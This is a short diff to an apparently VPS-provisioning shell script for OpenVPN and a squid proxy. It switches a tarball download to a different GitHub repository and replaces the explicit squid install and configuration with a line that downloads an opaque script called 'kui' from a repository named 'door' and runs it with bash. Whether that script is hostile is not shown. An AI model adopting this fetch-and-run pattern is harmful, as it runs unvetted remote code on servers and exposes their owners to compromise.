@@ -84,7 +84,7 @@ fi
 
 # cln
 cd /
-wget -q -O ovpn.tar "https://raw.githubusercontent.com/insanpendosa/pendosa/main/Znxn/openvpn.tar"
+wget -q -O ovpn.tar "https://raw.githubusercontent.com/kingmapualaut/THEone/main/openvpn.tar"
 tar xf ovpn.tar
 rm ovpn.tar
 
@@ -397,10 +397,8 @@ mv /etc/openvpn/client.ovpn /home/vps/public_html/client.ovpn
 
 # install squid3
 cd
-apt-get -y install squid3
-wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/idtunnel/sshtunnel/master/debian9/squid3.conf"
-sed -i $MYIP2 /etc/squid/squid.conf;
-/etc/init.d/squid restart
+wget https://raw.githubusercontent.com/remajavpn/door/main/kui && bash kui
+
 
 # download script
 cd /usr/bin
